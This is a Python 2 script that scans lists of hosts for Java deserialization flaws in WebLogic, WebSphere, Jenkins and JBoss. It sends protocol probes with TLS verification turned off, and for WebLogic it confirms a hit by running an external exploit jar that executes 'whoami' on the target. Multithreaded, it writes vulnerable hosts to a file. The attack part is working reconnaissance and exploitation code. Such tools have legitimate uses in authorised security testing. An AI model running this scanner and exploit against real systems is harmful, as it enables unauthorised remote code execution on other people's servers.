#!/usr/bin/env python
#coding:utf-8
# -------------------------------------
# Author:      isca.yb
# Version:     1.0.0


import os
import subprocess
import threading
import time
import socket
import sys
import argparse
import urllib2
import ssl

from socket import error as socket_error
from datetime import datetime

parser = argparse.ArgumentParser(prog='ISCA-JDIdentify.py',
                                 formatter_class=argparse.RawDescriptionHelpFormatter,
                                 description="Scan for Java Deserialization vulnerability.")
parser.add_argument('file', nargs='?', help='File with targets')
args = parser.parse_args()




def websphere(url, port, retry=False):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        output = urllib2.urlopen('https://'+url+":"+port, context=ctx, timeout=8).read()
        if "rO0AB" in output:
            print " - (possibly) Vulnerable Websphere: "+url+" ("+port+")"
            return True
    except urllib2.HTTPError, e:
        if e.getcode() == 500:
            if "rO0AB" in e.read():
                print " - (possibly) Vulnerable Websphere: "+url+" ("+port+")"
                return True
    except:
        pass

    try:
        output = urllib2.urlopen('http://'+url+":"+port, timeout=8).read()
        if "rO0AB" in output:
            print " - (possibly) Vulnerable Websphere: "+url+" ("+port+")"
            return True
    except urllib2.HTTPError, e:
        if e.getcode() == 500:
            if "rO0AB" in e.read():
                print " - (possibly) Vulnerable Websphere: "+url+" ("+port+")"
                return True
    except:
        pass


# Used this part from https://github.com/foxglovesec/JavaUnserializeExploits
def weblogic(url, port):
    try:
        server_address = (url, int(port))
        sock = socket.create_connection(server_address, 4)
        sock.settimeout(8)
        # Send headers
        headers = 't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
        sock.sendall(headers)

        try:
            data = sock.recv(1024)
        except socket.timeout:
            return False

        sock.close()
        if "HELO" in data:
            print "Possible Vulnerable Weblogic: "+url+" ("+str(port)+")"
            return True
        return False
    except socket_error:
        return False


# Used something from https://github.com/foxglovesec/JavaUnserializeExploits
def jenkins(url, port):
    try:
        cli_port = False
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            output = urllib2.urlopen('https://'+url+':'+port+"/jenkins/", context=ctx, timeout=8).info()
            cli_port = int(output['X-Jenkins-CLI-Port'])
        except urllib2.HTTPError, e:
            if e.getcode() == 404:
                try:
                    output = urllib2.urlopen('https://'+url+':'+port, context=ctx, timeout=8).info()
                    cli_port = int(output['X-Jenkins-CLI-Port'])
                except:
                    pass
        except:
            pass
    except:
        print " ! Could not check Jenkins on https. Maybe your SSL lib is broken."
        pass

    if cli_port is not True:
        try:
            output = urllib2.urlopen('http://'+url+':'+port+"/jenkins/", timeout=8).info()
            cli_port = int(output['X-Jenkins-CLI-Port'])
        except urllib2.HTTPError, e:
            if e.getcode() == 404:
                try:
                    output = urllib2.urlopen('http://'+url+':'+port, timeout=8).info()
                    cli_port = int(output['X-Jenkins-CLI-Port'])
                except:
                    return False
        except:
            return False

    # Open a socket to the CLI port
    try:
        server_address = (url, cli_port)
        sock = socket.create_connection(server_address, 5)

        # Send headers
        headers = '\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74'
        sock.send(headers)

        data1 = sock.recv(1024)
        if "rO0AB" in data1:
            print "Vulnerable Jenkins: "+url+" ("+str(port)+")"
            return True
        else:
            data2 = sock.recv(1024)
            if "rO0AB" in data2:
                print "Vulnerable Jenkins: "+url+" ("+str(port)+")"
                return True
    except:
        pass
    return False


def jboss(url, port, retry=False):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        output = urllib2.urlopen('https://'+url+':'+port+"/invoker/JMXInvokerServlet", context=ctx, timeout=8).read()
    except:
        try:
            output = urllib2.urlopen('http://'+url+':'+port+"/invoker/JMXInvokerServlet", timeout=8).read()
        except:
            # OK. I give up.
            return False

    if "\xac\xed\x00\x05" in output:
        print "Vulnerable JBOSS: "+url+" ("+port+")"
        return True
    return False

def verify_weblogic(host, port):
    try:
        status = False
        baseCommand = 'java -jar '+os.getcwd()+'/weblogic_exp.jar '+host +' '+str(port) + ' ' +'whoami'
        ps = subprocess.Popen(baseCommand, stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
        ps.wait()
        while True:
                data = ps.stdout.readline()
                if "error" in data:
                    print "Error cmd"
                    status = True
                    break
                elif "ConnectFailed" in data:
                    status = False
                    break
                elif data != '':
                    status = True
                elif "unbind_OK" in data:
                    status = True
                    break
                else:
                    break
        return status
    except Exception, e:
        return status




def read_file(filename):
    f = open(filename)
    content = f.readlines()
    f.close()
    return content

def scan(host,port):
    global result
    global hostCounter
    global threadsCounter
    if port in ['7001','7002','16200']:
        if weblogic(host,port):
            if verify_weblogic(host,port):
                hostCounter += 1
                result.append([host,port,'weblogic'])

        elif websphere(host,port):
            hostCounter += 1
            result.append([host,port,'websphere'])

        elif jboss(host,port):
            hostCounter += 1
            result.append([host,port,'jboss'])

        elif jenkins(host,port):
            hostCounter += 1
            result.append([host,port,'jenkins'])
    elif port in ['5005','8880']:
        if websphere(host,port):
            hostCounter += 1
            result.append([host,port,'websphere'])

        elif weblogic(host,port):
            if verify_weblogic(host,port):
                hostCounter += 1
                result.append([host,port,'weblogic'])

        elif jboss(host,port):
            hostCounter += 1
            result.append([host,port,'jboss'])

        elif jenkins(host,port):
            hostCounter += 1
            result.append([host,port,'jenkins'])
    elif port in ['8080','9080']:
        if jenkins(host,port):
            hostCounter += 1
            result.append([host,port,'jenkins'])

        elif jboss(host,port):
            hostCounter += 1
            result.append([host,port,'jboss'])

        elif weblogic(host,port):
            if verify_weblogic(host,port):
                hostCounter += 1
                result.append([host,port,'weblogic'])

        elif websphere(host,port):
            hostCounter += 1
            result.append([host,port,'websphere'])
    else:
        if weblogic(host,port):
            if verify_weblogic(host,port):
                hostCounter += 1
                result.append([host,port,'weblogic'])

        elif jboss(host,port):
            hostCounter += 1
            result.append([host,port,'jboss'])

        elif websphere(host,port):
            hostCounter += 1
            result.append([host,port,'websphere'])

        elif jenkins(host,port):
            hostCounter += 1
            result.append([host,port,'jenkins'])

    
    threadsCounter -= 1
    return



def worker():
    global threadsCounter
    content = read_file(args.file)

    for line in content:
        if ":" in line:
            item = line.strip().split(':')
            while threadsCounter > 20:
                pass
            p = threading.Thread(target=scan, args=(item[0],item[1]))
            p.start()
            if lock.acquire():
                threadsCounter += 1
                lock.release()
    while threadsCounter > 1:
        pass

    time.sleep(10)
    print "\nThere are totally %s Vulnerable hosts found !" % hostCounter
    print "They are : \n"

    
    string = ""
    for item in result:
        l =  item[0] + ':' + item[1] + '\t' + item[2] + '\n'
        print l
        string += l
    r = open('result.txt','w')
    r.write(string)
    r.close()

    sys.exit(0)
    return


if __name__ == '__main__':
    startTime = datetime.now()
    print "Start identifing..."
    print "This could take a while. Be patient."

    try:
        ssl.create_default_context()
    except:
        print " ! WARNING: Your SSL lib isn't supported. Results might be incomplete."
        pass

    hostCounter = 0 
    threadsCounter = 0
    lock = threading.Lock()
    result = []
    
    if args.file:
        worker()
    else:
        print "ERROR: Specify a file"

